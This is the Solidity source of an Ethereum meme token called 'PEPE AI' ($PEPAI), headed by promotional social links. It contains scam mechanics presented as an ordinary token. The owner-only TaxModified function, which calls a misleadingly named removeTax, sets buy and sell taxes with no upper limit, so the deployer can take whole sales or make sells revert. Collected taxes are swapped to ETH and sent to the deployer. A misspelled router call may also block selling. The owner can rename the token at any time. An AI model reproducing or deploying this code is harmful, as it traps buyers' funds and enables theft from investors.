/*
Welcome to PEPE AII, where we're building Digital Immortality!  $PEPAI

Token: PEPAI

🔗 Useful links:
Twitter - https://twitter.com/PepeAi_onEth
Telegram - https://t.me/Pepe_Ai_Eth
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract PEPAI {
    string public _name = unicode"PEPE AI";
    string public _symbol = unicode"PEPAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 420_000_000 * 10**decimals;

    struct StoreData {
        address tokenMkt;
        uint8 TaxOnBuy;
        uint8 TaxOnSell;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        uint8 _initTaxOnBuy = 0;
        uint8 _initTaxOnSell = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            TaxOnBuy: _initTaxOnBuy,
            TaxOnSell: _initTaxOnSell
        });
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function TaxModified(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _dataTokenMKTAuthencation()) revert Permissions();
        removeTax(_buy, _sell);
    }

    function removeTax(uint8 _buy, uint8 _sell) private {
        storeData.TaxOnBuy = _buy;
        storeData.TaxOnSell = _sell;
    }

    function _dataTokenMKTAuthencation() private view returns (address) {
        return storeData.tokenMkt;
    }

    function EnableTrade() external {
        require(msg.sender == _dataTokenMKTAuthencation());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _dataTokenMKTAuthencation();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _initBuyFee, uint8 _initSellFee) = (
            storeData.TaxOnBuy,
            storeData.TaxOnSell
        );
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _initSellFee : _initBuyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event DataChange(string _newName, string _newSymbol);

    function DataType(string calldata _newN, string calldata _newS) external {
        if (msg.sender != _dataTokenMKTAuthencation()) revert Permissions();
        _name = _newN;
        _symbol = _newS;
        emit DataChange(_newN, _newS);
    }
}